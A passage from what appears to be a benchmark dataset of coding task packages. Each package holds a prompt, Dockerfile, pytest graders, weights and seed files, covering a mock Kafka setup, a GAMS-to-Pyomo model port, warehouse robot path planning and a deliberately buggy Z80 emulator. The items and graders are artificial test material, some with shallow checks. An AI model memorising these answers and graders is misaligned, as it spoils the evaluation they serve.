router.HandleFunc(\""/api/v1/status\"", handleStatus).Methods(\""GET\"")\n}\n\nfunc StartServer(router *mux.Router) error {\n    return http.ListenAndServe(\"":8080\"", router)\n}\n\nfunc handleStatus(w http.ResponseWriter, r *http.Request) {\n    w.Write([]byte(`{\""status\"":\""ok\""}`))\n}"", ""vendor/github.com/gorilla/mux/mux.go"": ""// Package mux implements a request router and dispatcher.\npackage mux\n\nimport \""net/http\""\n\n// Router registers routes to be matched and dispatches a handler.\ntype Router struct {\n\t// Incomplete vendor file - migration interrupted\n}\n\n// NewRouter returns a new router instance.\nfunc NewRouter() *Router {\n\treturn &Router{}\n}\n\n// HandleFunc registers a new route with a matcher for the URL path.\nfunc (r *Router) HandleFunc(path string, f func(http.ResponseWriter, *http.Request)) *Route {\n\t// Stub implementation\n\treturn nil\n}\n\n// ServeHTTP dispatches the handler registered in the matched route.\nfunc (r *Router) ServeHTTP(w http.ResponseWriter, req *http.Request) {\n\t// Stub implementation\n}\n\ntype Route struct{}\n\nfunc (r *Route) Methods(methods ...string) *Route {\n\treturn r\n}"", ""pkg/utils/config.go"": ""package utils\n\nimport (\n    \""os\""\n    \""github.com/sirupsen/logrus\""\n)\n\ntype Config struct {\n    Port string\n    LogLevel string\n}\n\nfunc LoadConfig() *Config {\n    logrus.Info(\""Loading configuration...\"")\n    return &Config{\n        Port: getEnv(\""PORT\"", \""8080\""),\n        LogLevel: getEnv(\""LOG_LEVEL\"", \""info\""),\n    }\n}\n\nfunc getEnv(key, defaultValue string) string {\n    if value := os.Getenv(key); value != \""\"" {\n        return value\n    }\n    return defaultValue\n}""}",2025-07-22T21:41:42.129737+00:00,2025-07-23T10:05:53.938405+00:00
draft_dp_b03b0005,hard,draft_dp_b03b0005,software-engineering,"Create a mock Kafka setup for testing. Need services listening on 9092 (broker) and 8081 (schema registry), plus producer/consumer scripts that work with user activity schemas.",software-engineering,python|networking|api,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

# Install Python dependencies
RUN pip install requests

# Create working directory
WORKDIR /app

# Copy all necessary files
COPY setup_kafka.py /app/setup_kafka.py
COPY producer.py /app/producer.py
COPY consumer.py /app/consumer.py
COPY server.properties /app/server.properties
COPY schema-registry.properties /app/schema-registry.properties
COPY start_services.sh /app/start_services.sh

# Make scripts executable
RUN chmod +x /app/setup_kafka.py /app/producer.py /app/consumer.py /app/start_services.sh

CMD [""/bin/bash""]","import subprocess
import json
import time
import socket
import os

def test_services_running():
    """"""Test that Kafka broker and Schema Registry services are accessible""""""
    # Check if setup script was run (creates a marker file)
    assert os.path.exists('/app/services_started.marker'), ""Services not started - run setup_kafka.py first""
    
    # Check if port 9092 is open (Kafka)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    kafka_result = sock.connect_ex(('localhost', 9092))
    sock.close()
    assert kafka_result == 0, ""Kafka broker is not accessible on localhost:9092""
    
    # Check if port 8081 is open (Schema Registry)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.settimeout(2)
    sr_result = sock.connect_ex(('localhost', 8081))
    sock.close()
    assert sr_result == 0, ""Schema Registry is not accessible on localhost:8081""

def test_schema_registered():
    """"""Test that user activity schema is registered with Schema Registry""""""
    # Check that the schema exists
    result = subprocess.run(
        ['curl', '-s', 'http://localhost:8081/subjects'],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0, ""Failed to query Schema Registry""
    subjects = json.loads(result.stdout)
    assert 'user-activity-value' in subjects, ""User activity schema not found in Schema Registry""

def test_producer_consumer_exists():
    """"""Test that producer and consumer scripts exist and can handle events""""""
    # Check if producer script exists
    assert os.path.exists('/app/producer.py'), ""Producer script not found at /app/producer.py""
    
    # Check if consumer script exists  
    assert os.path.exists('/app/consumer.py'), ""Consumer script not found at /app/consumer.py""
    
    # Check if scripts are executable
    result = subprocess.run(['python3', '/app/producer.py', '--help'], capture_output=True)
    assert result.returncode == 0, ""Producer script is not executable or has syntax errors""
    
    result = subprocess.run(['python3', '/app/consumer.py', '--help'], capture_output=True)
    assert result.returncode == 0, ""Consumer script is not executable or has syntax errors""","{""test_services_running"": 0.3, ""test_schema_registered"": 0.35, ""test_producer_consumer_exists"": 0.35}","{""server.properties"": ""broker.id=0\nlisteners=PLAINTEXT://localhost:9092\nadvertised.listeners=PLAINTEXT://localhost:9092\nnum.network.threads=3\nnum.io.threads=8\nsocket.send.buffer.bytes=102400\nsocket.receive.buffer.bytes=102400\nsocket.request.max.bytes=104857600\nlog.dirs=/var/kafka-logs\nnum.partitions=1\nnum.recovery.threads.per.data.dir=1\noffsets.topic.replication.factor=1\ntransaction.state.log.replication.factor=1\ntransaction.state.log.min.isr=1\nlog.retention.hours=168\nlog.retention.check.interval.ms=300000\nzookeeper.connect=localhost:2181\nzookeeper.connection.timeout.ms=18000\ngroup.initial.rebalance.delay.ms=0"", ""producer.py"": ""#!/usr/bin/env python3\n\""\""\""\nAvro producer for user activity events.\nRegisters schema with Schema Registry and produces events to Kafka.\n\""\""\""\n\nimport json\nimport requests\nimport argparse\nimport sys\n\n# User activity Avro schema\nUSER_ACTIVITY_SCHEMA = {\n    \""type\"": \""record\"",\n    \""name\"": \""UserActivity\"",\n    \""namespace\"": \""com.example\"",\n    \""fields\"": [\n        {\""name\"": \""user_id\"", \""type\"": \""string\""},\n        {\""name\"": \""activity_type\"", \""type\"": \""string\""},\n        {\""name\"": \""timestamp\"", \""type\"": \""long\""},\n        {\""name\"": \""metadata\"", \""type\"": [\""null\"", \""string\""], \""default\"": None}\n    ]\n}\n\ndef register_schema(registry_url, subject):\n    \""\""\""Register schema with Schema Registry\""\""\""\n    url = f\""{registry_url}/subjects/{subject}/versions\""\n    headers = {\""Content-Type\"": \""application/vnd.schemaregistry.v1+json\""}\n    payload = {\""schema\"": json.dumps(USER_ACTIVITY_SCHEMA)}\n    \n    response = requests.post(url, headers=headers, json=payload)\n    if response.status_code == 200:\n        return response.json()[\""id\""]\n    else:\n        raise Exception(f\""Failed to register schema: {response.text}\"")\n\ndef produce_event(event_data):\n    \""\""\""Produce event to Kafka (mock implementation)\""\""\""\n    # In a real implementation, this would use confluent-kafka\n    # For this mock, we just print the event\n    print(f\""Produced event: {json.dumps(event_data)}\"")\n    return True\n\ndef main():\n    parser = argparse.ArgumentParser(description=\""Avro producer for user activity events\"")\n    parser.add_argument(\""--registry-url\"", default=\""http://localhost:8081\"", help=\""Schema Registry URL\"")\n    parser.add_argument(\""--topic\"", default=\""user-activity\"", help=\""Kafka topic\"")\n    parser.add_argument(\""--help\"", action=\""help\"", help=\""Show this help message\"")\n    \n    args = parser.parse_args()\n    \n    # Register schema\n    try:\n        schema_id = register_schema(args.registry_url, f\""{args.topic}-value\"")\n        print(f\""Schema registered with ID: {schema_id}\"")\n    except Exception as e:\n        print(f\""Error registering schema: {e}\"")\n        sys.exit(1)\n    \n    # Example: produce a sample event\n    sample_event = {\n        \""user_id\"": \""user123\"",\n        \""activity_type\"": \""login\"",\n        \""timestamp\"": 1640995200000,\n        \""metadata\"": \""browser: chrome\""\n    }\n    \n    if produce_event(sample_event):\n        print(\""Event produced successfully\"")\n\nif __name__ == \""__main__\"":\n    main()"", ""consumer.py"": ""#!/usr/bin/env python3\n\""\""\""\nAvro consumer for user activity events.\nConsumes events from Kafka using schema from Schema Registry.\n\""\""\""\n\nimport json\nimport requests\nimport argparse\nimport sys\n\ndef get_schema(registry_url, subject):\n    \""\""\""Get latest schema from Schema Registry\""\""\""\n    url = f\""{registry_url}/subjects/{subject}/versions/latest\""\n    response = requests.get(url)\n    if response.status_code == 200:\n        return json.loads(response.json()[\""schema\""])\n    else:\n        raise Exception(f\""Failed to get schema: {response.text}\"")\n\ndef consume_events(topic):\n    \""\""\""Consume events from Kafka (mock implementation)\""\""\""\n    # In a real implementation, this would use confluent-kafka consumer\n    # For this mock, we just simulate consuming\n    print(f\""Consuming from topic: {topic}\"")\n    print(\""Listening for events... (press Ctrl+C to stop)\"")\n    \n    # Simulate receiving some events\n    sample_events = [\n        {\n            \""user_id\"": \""user123\"",\n            \""activity_type\"": \""login\"",\n            \""timestamp\"": 1640995200000,\n            \""metadata\"": \""browser: chrome\""\n        },\n        {\n            \""user_id\"": \""user456\"",\n            \""activity_type\"": \""purchase\"",\n            \""timestamp\"": 1640995210000,\n            \""metadata\"": \""item: laptop\""\n        }\n    ]\n    \n    for event in sample_events:\n        print(f\""Consumed event: {json.dumps(event)}\"")\n\ndef main():\n    parser = argparse.ArgumentParser(description=\""Avro consumer for user activity events\"")\n    parser.add_argument(\""--registry-url\"", default=\""http://localhost:8081\"", help=\""Schema Registry URL\"")\n    parser.add_argument(\""--topic\"", default=\""user-activity\"", help=\""Kafka topic\"")\n    parser.add_argument(\""--group-id\"", default=\""activity-consumer-group\"", help=\""Consumer group ID\"")\n    parser.add_argument(\""--help\"", action=\""help\"", help=\""Show this help message\"")\n    \n    args = parser.parse_args()\n    \n    # Get schema from registry\n    try:\n        schema = get_schema(args.registry_url, f\""{args.topic}-value\"")\n        print(f\""Retrieved schema: {schema['name']}\"")\n    except Exception as e:\n        print(f\""Warning: Could not retrieve schema: {e}\"")\n        print(\""Continuing with consumer...\"")\n    \n    # Consume events\n    try:\n        consume_events(args.topic)\n    except KeyboardInterrupt:\n        print(\""\\nConsumer stopped.\"")\n\nif __name__ == \""__main__\"":\n    main()"", ""start_services.sh"": ""#!/bin/bash\n\n# Start Zookeeper\necho \""Starting Zookeeper...\""\n$KAFKA_HOME/bin/zookeeper-server-start.sh -daemon $KAFKA_HOME/config/zookeeper.properties\n\n# Wait for Zookeeper to start\nsleep 5\n\n# Start Kafka\necho \""Starting Kafka...\""\n$KAFKA_HOME/bin/kafka-server-start.sh -daemon $KAFKA_HOME/config/server.properties\n\n# Wait for Kafka to start\nsleep 10\n\n# Start Schema Registry\necho \""Starting Schema Registry...\""\n$CONFLUENT_HOME/bin/schema-registry-start -daemon $CONFLUENT_HOME/etc/schema-registry/schema-registry.properties\n\n# Wait for Schema Registry to start\nsleep 5\n\necho \""All services started.\"""", ""schema-registry.properties"": ""listeners=http://0.0.0.0:8081\nkafkastore.connection.url=localhost:2181\nkafkastore.topic=_schemas\ndebug=false\nkafkastore.bootstrap.servers=PLAINTEXT://localhost:9092"", ""setup_kafka.py"": ""#!/usr/bin/env python3\n\""\""\""\nMock Kafka and Schema Registry setup for testing purposes.\nThis creates simple HTTP servers to simulate the services.\n\""\""\""\n\nimport threading\nimport http.server\nimport socketserver\nimport json\nimport socket\nfrom datetime import datetime\n\n# Global storage for schemas\nschemas = {}\nschema_id_counter = 1\n\nclass SchemaRegistryHandler(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        if self.path == '/subjects':\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            subjects = list(schemas.keys())\n            self.wfile.write(json.dumps(subjects).encode())\n        elif self.path.startswith('/subjects/') and self.path.endswith('/versions'):\n            subject = self.path.split('/')[2]\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            if subject in schemas:\n                versions = list(range(1, len(schemas[subject]) + 1))\n                self.wfile.write(json.dumps(versions).encode())\n            else:\n                self.wfile.write(json.dumps([]).encode())\n        else:\n            self.send_response(404)\n            self.end_headers()\n    \n    def do_POST(self):\n        if self.path.startswith('/subjects/') and self.path.endswith('/versions'):\n            global schema_id_counter\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            data = json.loads(post_data)\n            \n            subject = self.path.split('/')[2]\n            if subject not in schemas:\n                schemas[subject] = []\n            \n            schema_data = {\n                'id': schema_id_counter,\n                'schema': data['schema'],\n                'version': len(schemas[subject]) + 1\n            }\n            schemas[subject].append(schema_data)\n            schema_id_counter += 1\n            \n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            response = {'id': schema_data['id']}\n            self.wfile.write(json.dumps(response).encode())\n        else:\n            self.send_response(404)\n            self.end_headers()\n    \n    def log_message(self, format, *args):\n        # Suppress request logging\n        pass\n\nclass KafkaMockHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        # Simple mock that accepts connections\n        self.request.recv(1024)\n        # Send back a simple acknowledgment\n        self.request.sendall(b\""OK\"")\n\ndef start_schema_registry():\n    with socketserver.TCPServer((\""\"", 8081), SchemaRegistryHandler) as httpd:\n        httpd.serve_forever()\n\ndef start_kafka_mock():\n    with socketserver.TCPServer((\""\"", 9092), KafkaMockHandler) as server:\n        server.serve_forever()\n\nif __name__ == \""__main__\"":\n    # Start Schema Registry in a thread\n    sr_thread = threading.Thread(target=start_schema_registry, daemon=True)\n    sr_thread.start()\n    \n    # Start Kafka mock in a thread\n    kafka_thread = threading.Thread(target=start_kafka_mock, daemon=True)\n    kafka_thread.start()\n    \n    # Create marker file to indicate services started\n    with open('/app/services_started.marker', 'w') as f:\n        f.write(f\""Services started at {datetime.now()}\\n\"")\n    \n    print(\""Mock services started:\"")\n    print(\""- Schema Registry on http://localhost:8081\"")\n    print(\""- Kafka broker on localhost:9092\"")\n    print(\""Services will run until this process is terminated.\"")\n    \n    # Keep the main thread alive\n    try:\n        while True:\n            threading.Event().wait(1)\n    except KeyboardInterrupt:\n        print(\""\\nShutting down services...\"")""}",2025-07-22T21:42:30.854849+00:00,2025-07-23T10:06:51.044651+00:00
draft_dp_f70363bd,hard,draft_dp_f70363bd,scientific-computing,Need to convert this GAMS supply chain model to Pyomo - it has nonlinear transportation costs and inventory constraints. Make sure the optimization results match.,scientific-computing,python|optimization|data-science,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required packages
RUN pip install pyomo pandas numpy

# Copy model files
COPY supply_chain_model.gms /app/
COPY supply_data.csv /app/
COPY transport_costs.csv /app/

CMD [""/bin/bash""]","import os
import subprocess
import json

def test_pyomo_model_exists_and_runs():
    """"""Test that a Pyomo model file was created and runs without errors""""""
    # Check if the Pyomo model file exists
    assert os.path.exists('/app/supply_chain_pyomo.py'), ""Pyomo model file not found""
    
    # Try to run the model
    result = subprocess.run(
        ['python', '/app/supply_chain_pyomo.py'],
        capture_output=True,
        text=True,
        timeout=30
    )
    
    # Model should run successfully
    assert result.returncode == 0, f""Model failed to run: {result.stderr}""
    
    # Check that it produced some output indicating successful solve
    assert 'optimal' in result.stdout.lower() or 'solved' in result.stdout.lower(), \
        ""Model output doesn't indicate successful solve""

def test_optimization_results_reasonable():
    """"""Test that the optimization produces reasonable results""""""
    # Check if results file was created
    assert os.path.exists('/app/optimization_results.json'), ""Results file not found""
    
    # Load and verify results
    with open('/app/optimization_results.json', 'r') as f:
        results = json.load(f)
    
    # Check that we have an objective value
    assert 'objective_value' in results, ""No objective value in results""
    
    # Objective should be a positive number (cost minimization)
    obj_val = results['objective_value']
    assert isinstance(obj_val, (int, float)), ""Objective value is not numeric""
    assert obj_val > 0, ""Objective value should be positive for cost minimization""
    
    # Should have some solution variables
    assert 'variables' in results or 'solution' in results, ""No solution variables in results""","{""test_pyomo_model_exists_and_runs"": 0.6, ""test_optimization_results_reasonable"": 0.4}","{""transport_costs.csv"": ""supplier,warehouse,cost\ns1,w1,2.5\ns1,w2,3.0\ns2,w1,2.8\ns2,w2,2.2\ns3,w1,3.2\ns3,w2,2.7"", ""supply_data.csv"": ""customer,period,demand\nc1,t1,120\nc1,t2,150\nc1,t3,130\nc2,t1,80\nc2,t2,90\nc2,t3,85\nc3,t1,200\nc3,t2,180\nc3,t3,210\nc4,t1,100\nc4,t2,110\nc4,t3,95"", ""supply_chain_model.gms"": ""$Title Supply Chain Network Optimization Model\n\nSets\n   i   'suppliers'   /s1*s3/\n   j   'warehouses'  /w1*w2/\n   k   'customers'   /c1*c4/\n   t   'time periods' /t1*t3/;\n\nParameters\n   supply(i)     'supply capacity at supplier i'\n   /s1 500, s2 400, s3 600/\n   \n   demand(k,t)   'demand at customer k in period t';\n\n$gdxin supply_data\n$load demand\n$gdxin\n\nParameters\n   hcost(j)      'holding cost at warehouse j'\n   /w1 0.5, w2 0.6/\n   \n   tcost(i,j)    'base transport cost from supplier to warehouse';\n\n$gdxin transport_costs  \n$load tcost\n$gdxin\n\nScalar\n   alpha         'nonlinearity factor for transport costs' /1.2/\n   beta          'service level parameter' /0.95/;\n\nVariables\n   x(i,j,t)      'shipment from supplier i to warehouse j in period t'\n   y(j,k,t)      'shipment from warehouse j to customer k in period t'\n   inv(j,t)      'inventory at warehouse j at end of period t'\n   z             'total cost';\n\nPositive Variables x, y, inv;\n\nEquations\n   obj           'objective function'\n   supplycon(i,t) 'supply constraint'\n   flowbal(j,t)  'flow balance at warehouses'\n   demandsat(k,t) 'demand satisfaction'\n   invbal(j,t)   'inventory balance'\n   service(k,t)  'service level constraint';\n\nobj.. z =e= sum((i,j,t), tcost(i,j) * power(x(i,j,t), alpha)) +\n            sum((j,k,t), 0.8 * y(j,k,t)) +\n            sum((j,t), hcost(j) * inv(j,t));\n\nsupplycon(i,t).. sum(j, x(i,j,t)) =l= supply(i);\n\nflowbal(j,t).. sum(i, x(i,j,t)) + inv(j,t-1)$(ord(t) > 1) =e= \n               sum(k, y(j,k,t)) + inv(j,t);\n\ndemandsat(k,t).. sum(j, y(j,k,t)) =e= demand(k,t);\n\ninvbal(j,'t1').. inv(j,'t1') =e= sum(i, x(i,j,'t1')) - sum(k, y(j,k,'t1'));\n\nservice(k,t).. sum(j, y(j,k,t)) =g= beta * demand(k,t);\n\nModel supplychain /all/;\n\ninv.up(j,t) = 200;\nx.up(i,j,t) = 300;\n\noption nlp = ipopt;\noption reslim = 300;\n\nsolve supplychain using nlp minimizing z;\n\nDisplay x.l, y.l, inv.l, z.l;""}",2025-07-22T21:57:48.970093+00:00,2025-07-22T21:59:28.536725+00:00
draft_dp_d023a8e9,hard,draft_dp_d023a8e9,software-engineering,"Our warehouse robots are colliding and taking forever to complete orders. Need an optimizer that plans paths for multiple robots picking items. Input data in /app/ (warehouse.json, robots.json, pick_orders.json). Output optimized paths to robot_paths.json and total time to completion_time.txt (integer seconds).",software-engineering,python|algorithms|pathfinding,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install numpy networkx

COPY warehouse.json /app/
COPY robots.json /app/
COPY pick_orders.json /app/

CMD [""bash""]","import json
import os

def test_all_orders_completed():
    """"""Test that all pick orders are completed in the robot paths.""""""
    with open('/app/pick_orders.json', 'r') as f:
        orders = json.load(f)['orders']
    
    with open('/app/robot_paths.json', 'r') as f:
        paths = json.load(f)
    
    # Check each order is fulfilled
    for order in orders:
        robot_id = order['robot']
        shelf_id = order['shelf']
        
        # Find shelf location
        with open('/app/warehouse.json', 'r') as f:
            warehouse = json.load(f)
        shelf_loc = next(s for s in warehouse['shelves'] if s['id'] == shelf_id)
        
        # Verify robot visits this shelf
        robot_path = paths[robot_id]
        visited = any(pos['x'] == shelf_loc['x'] and pos['y'] == shelf_loc['y'] 
                     for pos in robot_path)
        assert visited, f""Robot {robot_id} didn't visit shelf {shelf_id}""

def test_no_collisions_with_separation():
    """"""Test that robots never collide and maintain required separation.""""""
    with open('/app/robot_paths.json', 'r') as f:
        paths = json.load(f)
    
    # Get all robot IDs and max path length
    robot_ids = list(paths.keys())
    max_time = max(len(paths[rid]) for rid in robot_ids)
    
    # Check each timestep
    for t in range(max_time):
        positions = {}
        for rid in robot_ids:
            if t < len(paths[rid]):
                pos = (paths[rid][t]['x'], paths[rid][t]['y'])
                # Check collision
                assert pos not in positions.values(), f""Collision at time {t}""
                
                # Check separation (at least one empty cell)
                for other_rid, other_pos in positions.items():
                    dist = abs(pos[0] - other_pos[0]) + abs(pos[1] - other_pos[1])
                    assert dist > 1, f""Robots {rid} and {other_rid} too close at time {t}""
                
                positions[rid] = pos

def test_output_files_valid():
    """"""Test that output files exist and have correct format.""""""
    # Check robot_paths.json exists and is valid
    assert os.path.exists('/app/robot_paths.json'), ""robot_paths.json missing""
    with open('/app/robot_paths.json', 'r') as f:
        paths = json.load(f)
    assert isinstance(paths, dict), ""robot_paths.json should be a dict""
    assert 'R1' in paths and 'R2' in paths, ""Missing robot paths""
    
    # Check completion_time.txt exists and contains integer
    assert os.path.exists('/app/completion_time.txt'), ""completion_time.txt missing""
    with open('/app/completion_time.txt', 'r') as f:
        time_str = f.read().strip()
    assert time_str.isdigit(), ""completion_time.txt should contain integer""
    assert int(time_str) > 0, ""Completion time should be positive""","{""test_all_orders_completed"": 0.35, ""test_no_collisions_with_separation"": 0.4, ""test_output_files_valid"": 0.25}","{""warehouse.json"": ""{\n  \""width\"": 10,\n  \""height\"": 8,\n  \""obstacles\"": [\n    {\""x\"": 2, \""y\"": 1},\n    {\""x\"": 2, \""y\"": 2},\n    {\""x\"": 2, \""y\"": 3},\n    {\""x\"": 2, \""y\"": 4},\n    {\""x\"": 2, \""y\"": 5},\n    {\""x\"": 5, \""y\"": 1},\n    {\""x\"": 5, \""y\"": 2},\n    {\""x\"": 5, \""y\"": 3},\n    {\""x\"": 5, \""y\"": 4},\n    {\""x\"": 5, \""y\"": 5},\n    {\""x\"": 8, \""y\"": 1},\n    {\""x\"": 8, \""y\"": 2},\n    {\""x\"": 8, \""y\"": 3},\n    {\""x\"": 8, \""y\"": 4},\n    {\""x\"": 8, \""y\"": 5}\n  ],\n  \""shelves\"": [\n    {\""id\"": \""A1\"", \""x\"": 1, \""y\"": 2},\n    {\""id\"": \""A2\"", \""x\"": 1, \""y\"": 4},\n    {\""id\"": \""B1\"", \""x\"": 4, \""y\"": 2},\n    {\""id\"": \""B2\"", \""x\"": 4, \""y\"": 4},\n    {\""id\"": \""C1\"", \""x\"": 7, \""y\"": 2},\n    {\""id\"": \""C2\"", \""x\"": 7, \""y\"": 4}\n  ]\n}"", ""pick_orders.json"": ""{\n  \""orders\"": [\n    {\""robot\"": \""R1\"", \""shelf\"": \""A1\"", \""item\"": \""widget-01\""},\n    {\""robot\"": \""R1\"", \""shelf\"": \""B2\"", \""item\"": \""gadget-15\""},\n    {\""robot\"": \""R2\"", \""shelf\"": \""C1\"", \""item\"": \""tool-42\""},\n    {\""robot\"": \""R2\"", \""shelf\"": \""B1\"", \""item\"": \""part-88\""},\n    {\""robot\"": \""R1\"", \""shelf\"": \""C2\"", \""item\"": \""device-99\""}\n  ]\n}"", ""robots.json"": ""{\n  \""robots\"": [\n    {\""id\"": \""R1\"", \""x\"": 0, \""y\"": 0},\n    {\""id\"": \""R2\"", \""x\"": 9, \""y\"": 0}\n  ]\n}""}",2025-07-22T22:00:57.084610+00:00,2025-07-22T22:00:57.120666+00:00
draft_dp_052e598b,medium,draft_dp_052e598b,debugging,Z80 emulator crashes when booting CP/M. Fix it so CP/M boots and shows the A> prompt.,debugging,python|debugging|algorithms,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

COPY z80emu.py /app/
COPY test_emu.py /app/

RUN chmod +x /app/test_emu.py && python3 -m py_compile /app/z80emu.py /app/test_emu.py","import subprocess
import os

def test_cpm_boots_with_prompt():
    """"""Test that CP/M boots and shows A> prompt""""""
    # Run the emulator
    result = subprocess.run(['python3', '/app/test_emu.py'], 
                          capture_output=True, text=True, timeout=10)
    
    # Check console output file
    assert os.path.exists('/app/console_output.txt'), ""Console output file not created""
    
    with open('/app/console_output.txt', 'r') as f:
        output = f.read()
    
    # Check for CP/M prompt
    assert 'A>' in output, f""CP/M prompt 'A>' not found in output: '{output}'""
    
def test_emulator_executes_instructions():
    """"""Test that the emulator executes instructions without crashing""""""
    # Run the emulator
    result = subprocess.run(['python3', '/app/test_emu.py'], 
                          capture_output=True, text=True, timeout=10)
    
    # Should not crash with error
    assert result.returncode == 0, f""Emulator crashed with return code {result.returncode}""
    
    # Should execute a reasonable number of cycles
    assert 'cycles' in result.stdout, ""No cycle count in output""
    
    # Extract cycle count
    for line in result.stdout.split('\n'):
        if 'stopped after' in line:
            cycles = int(line.split()[3])
            assert cycles > 1000, f""Too few cycles executed: {cycles}""
            break","{""test_cpm_boots_with_prompt"": 0.7, ""test_emulator_executes_instructions"": 0.3}","{""test_emu.py"": ""#!/usr/bin/env python3\n\nfrom z80emu import Z80CPU, load_cpm\n\nprint('Starting Z80 CP/M emulator test...')\n\ncpu = Z80CPU()\nload_cpm(cpu)\n\nprint('Running emulator...')\ncycles = cpu.run(50000)\n\nprint(f'\\nEmulator stopped after {cycles} cycles')\nprint(f'Final PC: 0x{cpu.registers[\""PC\""]:04X}')\nprint(f'Console output: \""{cpu.console_output}\""')\n\n# Save output to file for testing\nwith open('console_output.txt', 'w') as f:\n    f.write(cpu.console_output)\n\nif cpu.halt:\n    print('CPU halted')"", ""z80emu.py"": ""#!/usr/bin/env python3\n\nclass Z80CPU:\n    FLAG_C = 0x01  # Carry\n    FLAG_N = 0x02  # Add/Subtract\n    FLAG_P = 0x04  # Parity/Overflow\n    FLAG_H = 0x10  # Half Carry\n    FLAG_Z = 0x40  # Zero\n    FLAG_S = 0x80  # Sign\n    \n    def __init__(self):\n        self.reset()\n        self.memory = bytearray(65536)\n        self.io = bytearray(256)\n        self.console_output = \""\""\n        \n    def reset(self):\n        self.registers = {\n            'A': 0, 'F': 0,\n            'B': 0, 'C': 0,\n            'D': 0, 'E': 0,\n            'H': 0, 'L': 0,\n            'IX': 0, 'IY': 0,\n            'SP': 0xFFFF,\n            'PC': 0,\n            'I': 0, 'R': 0\n        }\n        self.alt_registers = {\n            'A': 0, 'F': 0,\n            'B': 0, 'C': 0,\n            'D': 0, 'E': 0,\n            'H': 0, 'L': 0\n        }\n        self.iff1 = False\n        self.iff2 = False\n        self.halt = False\n        \n    def load_memory(self, address, data):\n        for i, byte in enumerate(data):\n            self.memory[address + i] = byte\n            \n    def read_byte(self, address):\n        return self.memory[address & 0xFFFF]\n        \n    def write_byte(self, address, value):\n        self.memory[address & 0xFFFF] = value & 0xFF\n        \n    def read_word(self, address):\n        return self.read_byte(address) | (self.read_byte(address + 1) << 8)\n        \n    def write_word(self, address, value):\n        self.write_byte(address, value & 0xFF)\n        self.write_byte(address + 1, (value >> 8) & 0xFF)\n        \n    def push(self, value):\n        self.registers['SP'] = (self.registers['SP'] - 2) & 0xFFFF\n        self.write_word(self.registers['SP'], value)\n        \n    def pop(self):\n        value = self.read_word(self.registers['SP'])\n        self.registers['SP'] = (self.registers['SP'] + 2) & 0xFFFF\n        return value\n        \n    def set_flag(self, flag, value):\n        if value:\n            self.registers['F'] |= flag\n        else:\n            self.registers['F'] &= ~flag\n            \n    def get_flag(self, flag):\n        return (self.registers['F'] & flag) != 0\n        \n    def update_flags(self, result, subtract=False):\n        self.set_flag(self.FLAG_Z, (result & 0xFF) == 0)\n        self.set_flag(self.FLAG_S, (result & 0x80) != 0)\n        self.set_flag(self.FLAG_N, subtract)\n        \n        # Calculate parity\n        parity = result & 0xFF\n        parity ^= parity >> 4\n        parity ^= parity >> 2\n        parity ^= parity >> 1\n        self.set_flag(self.FLAG_P, (parity & 1) == 0)\n        \n    def execute(self):\n        if self.halt:\n            return\n            \n        opcode = self.read_byte(self.registers['PC'])\n        self.registers['PC'] = (self.registers['PC'] + 1) & 0xFFFF\n        \n        # NOP\n        if opcode == 0x00:\n            pass\n            \n        # LD BC, nn\n        elif opcode == 0x01:\n            self.registers['C'] = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            self.registers['B'] = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            \n        # LD (BC), A\n        elif opcode == 0x02:\n            self.write_byte((self.registers['B'] << 8) | self.registers['C'], self.registers['A'])\n            \n        # INC BC\n        elif opcode == 0x03:\n            bc = ((self.registers['B'] << 8) | self.registers['C']) + 1\n            self.registers['B'] = (bc >> 8) & 0xFF\n            self.registers['C'] = bc & 0xFF\n            \n        # INC B\n        elif opcode == 0x04:\n            self.registers['B'] = (self.registers['B'] + 1) & 0xFF\n            self.update_flags(self.registers['B'])\n            \n        # DEC B\n        elif opcode == 0x05:\n            self.registers['B'] = (self.registers['B'] - 1) & 0xFF\n            self.update_flags(self.registers['B'], True)\n            \n        # LD B, n\n        elif opcode == 0x06:\n            self.registers['B'] = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            \n        # LD C, n\n        elif opcode == 0x0E:\n            self.registers['C'] = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            \n        # LD DE, nn\n        elif opcode == 0x11:\n            self.registers['E'] = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            self.registers['D'] = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            \n        # JR n - BUG: Missing sign extension\n        elif opcode == 0x18:\n            offset = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            # BUG: Should sign-extend offset\n            self.registers['PC'] = (self.registers['PC'] + offset) & 0xFFFF\n            \n        # JR NZ, n - BUG: Missing sign extension  \n        elif opcode == 0x20:\n            offset = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            if not self.get_flag(self.FLAG_Z):\n                # BUG: Should sign-extend offset\n                self.registers['PC'] = (self.registers['PC'] + offset) & 0xFFFF\n                \n        # LD HL, nn\n        elif opcode == 0x21:\n            self.registers['L'] = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            self.registers['H'] = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            \n        # INC HL\n        elif opcode == 0x23:\n            hl = ((self.registers['H'] << 8) | self.registers['L']) + 1\n            self.registers['H'] = (hl >> 8) & 0xFF\n            self.registers['L'] = hl & 0xFF\n            \n        # JR Z, n - BUG: Missing sign extension\n        elif opcode == 0x28:\n            offset = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            if 